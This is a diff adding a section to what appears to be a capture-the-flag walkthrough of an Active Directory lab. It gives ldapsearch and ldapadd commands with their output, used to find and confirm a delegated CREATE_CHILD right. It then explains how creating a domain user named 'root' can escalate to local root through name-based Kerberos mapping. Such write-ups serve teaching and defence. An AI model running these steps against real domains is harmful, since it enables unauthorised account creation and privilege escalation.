@@ -3400,7 +3400,121 @@ The diagnostic that separates the two cases is `kvno`. Running `kvno ldap/dc02.d
 <br>
 </div>
 
-### 
+### 4.5 — Identify and confirm CREATE_CHILD on the GiteaMigration OU
+
+`svc-runner` belongs to a non-default group, `ServiceHandler`, which carries no description and no nested memberships. Group membership grants nothing by itself, so the delegated rights must appear as access-control entries on other directory objects. Enumerate organisational units and test for write access.
+
+**Commands:**
+
+Enumerate OUs:
+
+```bash
+ldapsearch -Y GSSAPI -H ldap://DC02.darkzero.ext -b "DC=darkzero,DC=ext" \
+  "(objectClass=organizationalUnit)" dn 2>/dev/null | grep -E '^dn:'
+```
+
+Resolve the relevant SIDs:
+
+```bash
+ldapsearch -Y GSSAPI -H ldap://DC02.darkzero.ext -b "DC=darkzero,DC=ext" \
+  "(|(cn=ServiceHandler)(sAMAccountName=svc-runner))" objectSid 2>/dev/null | grep -iE 'dn:|objectSid'
+```
+
+```bash
+python3 -c "
+import base64,struct
+for label,b in [('ServiceHandler','AQUAAAAAAAUVAAAADoLrqXJNY0l53Ex6WgQAAA=='),('svc-runner','AQUAAAAAAAUVAAAADoLrqXJNY0l53Ex6WQQAAA==')]:
+    d=base64.b64decode(b)
+    rev=d[0]; n=d[1]
+    auth=int.from_bytes(d[2:8],'big')
+    subs=struct.unpack('<%dI'%n, d[8:8+4*n])
+    print(label, 'S-%d-%d-'%(rev,auth)+'-'.join(map(str,subs)))
+"
+```
+
+Retrieve the DACL using the SD Flags control:
+
+```bash
+ldapsearch -Y GSSAPI -H ldap://DC02.darkzero.ext \
+  -b "OU=GiteaMigration,DC=darkzero,DC=ext" -s base \
+  -E '!1.2.840.113556.1.4.801=::MAMCAQc=' \
+  "(objectClass=*)" nTSecurityDescriptor 2>/dev/null | grep -vE '^#|^$'
+```
+
+Test the permission directly:
+
+```bash
+cat > /tmp/test.ldif << 'EOF'
+dn: CN=testobj,OU=GiteaMigration,DC=darkzero,DC=ext
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+sAMAccountName: testobj
+userAccountControl: 514
+EOF
+
+ldapadd -Y GSSAPI -H ldap://DC02.darkzero.ext -f /tmp/test.ldif
+```
+
+**Breakdown:**
+
+|Component|Purpose|Simple Explanation|
+|---|---|---|
+|`(objectClass=organizationalUnit)`|Filter for OU objects|List the containers in the directory|
+|`objectSid`|The principal's security identifier, base64-encoded binary|The unique ID that appears in permission entries|
+|`python3 ... struct.unpack`|Decode the binary SID into `S-1-5-21-…-RID` form|Turn the binary blob into readable form|
+|`-E '!1.2.840.113556.1.4.801=::MAMCAQc='`|LDAP SD Flags control, value 7|Request owner + group + DACL, excluding the SACL|
+|`!` prefix on the control|Marks the control as critical|Fail the request rather than silently ignore the control|
+|`userAccountControl: 514`|`ACCOUNTDISABLE` (0x2) + `NORMAL_ACCOUNT` (0x200)|Create the account disabled, avoiding password-policy checks at creation|
+|`ldapadd`|Create a new directory object|Write a new entry into the directory|
+
+**Result — OUs:**
+
+```
+dn: OU=Domain Controllers,DC=darkzero,DC=ext
+dn: OU=GiteaMigration,DC=darkzero,DC=ext
+```
+
+**Result — SIDs:**
+
+```
+ServiceHandler  S-1-5-21-2850783758-1231244658-2051857529-1114
+svc-runner      S-1-5-21-2850783758-1231244658-2051857529-1113
+```
+
+**Result — object creation:**
+
+```
+SASL username: svc-runner@DARKZERO.EXT
+SASL SSF: 256
+SASL data security layer installed.
+adding new entry "CN=testobj,OU=GiteaMigration,DC=darkzero,DC=ext"
+```
+
+**What this gives you:** Confirmed write access to a directory container — specifically, the ability to create new user objects in the domain.
+
+**Key findings:**
+
+- **`svc-runner` can create objects in `OU=GiteaMigration,DC=darkzero,DC=ext`.** The `ldapadd` succeeded with no error, empirically confirming a CREATE_CHILD grant. This matches reference material for this target, which records a `CREATE_CHILD` permission on this OU delegated to `svc-runner`.
+- Only two OUs exist: the built-in `Domain Controllers` and the custom `GiteaMigration`. The latter was created deliberately, presumably to delegate account provisioning during a migration, and the delegation was never revoked.
+- The domain SID is `S-1-5-21-2850783758-1231244658-2051857529`. `ServiceHandler` is RID 1114 and `svc-runner` is RID 1113 — both above 1000, marking them as domain-created rather than built-in principals. This distinction becomes important later when crossing a trust boundary.
+- **The `nTSecurityDescriptor` attribute returns empty without the SD Flags control.** By default, requesting the descriptor implies requesting the SACL, which requires `SeSecurityPrivilege`. Supplying the control with value 7 requests owner, group, and DACL only, and the DC then returns the descriptor.
+- `ServiceHandler` contains exactly two members: `svc-runner` and `svc-gitea`. The group has no description and belongs to no other groups — it exists purely to be referenced in ACLs.
+
+##### 4.5.1 Theory — Why creating a user is a privilege escalation
+
+Creating a disabled account in an obscure OU looks harmless. It is not, because of what the account can then be used _for_.
+
+Active Directory delegation is granular. An administrator can grant one principal the right to create child objects in one container without granting any other privilege — no group membership changes, no password resets elsewhere, no rights over existing objects. That is exactly what happened here, and in isolation the grant is defensible: a migration process needed to provision accounts.
+
+The problem is that a newly created domain account is a full domain principal. It can authenticate. It appears in the directory. And critically, **its name is chosen by whoever creates it.**
+
+That last property is the pivot. Several systems map identity by _name_ rather than by SID. On a Linux host joined to a domain, if `ksu` or a similar mechanism authorises a Kerberos principal to become a local user, and the authorisation rule is name-based with no `.k5login` file restricting which principals qualify, then creating a domain user called `root` produces a principal that the mapping treats as the local root account.
+
+The rights required are minimal: create one object, in one container, with a name of your choosing. Nothing about the ACL grants administrative privilege. The escalation comes from a name collision between two identity systems that were never designed to be authoritative over each other.
+
+**Next:** Remove the test object, create a domain user named `root` in the same OU, and set its password.
 <div align="center">
 <br>
 <br>
